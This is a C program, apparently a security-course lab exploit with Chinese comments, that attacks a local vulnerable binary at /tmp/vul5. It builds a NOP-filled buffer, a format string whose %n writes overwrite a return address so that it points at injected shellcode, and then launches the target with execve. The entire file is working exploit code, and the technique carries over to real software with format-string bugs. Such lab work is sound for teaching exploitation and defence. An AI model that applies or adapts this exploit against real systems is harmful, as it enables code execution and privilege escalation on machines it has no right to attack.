#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
  char payload[400];
  char *format_str;
  int i;

  for (i = 0; i < sizeof(payload); i++) {
		payload[i] = '\x90';				// 填充nop
	}
  // arg -> 0xbffffe61
  // shellcode -> 0xbfffff64

  format_str = "\xff\xff\xff\xff\x2c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2f\xfb\xff\xbf"
        "%65u%n"        // 0x20 + 65 = 0x61
        "%158u%n"       // 0x61 + 158 = 0xff
        "%256u%n"       // 0xff + 256 = 0x1ff
        "%192u%n";      // 0xff + 192 = 0x1bf
        // 将返回地址指向shellcode之前，此处设0xbfffff61
  memcpy(payload, format_str, strlen(format_str));
  memcpy(payload + 200 + strlen(format_str), shellcode, strlen(shellcode));

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
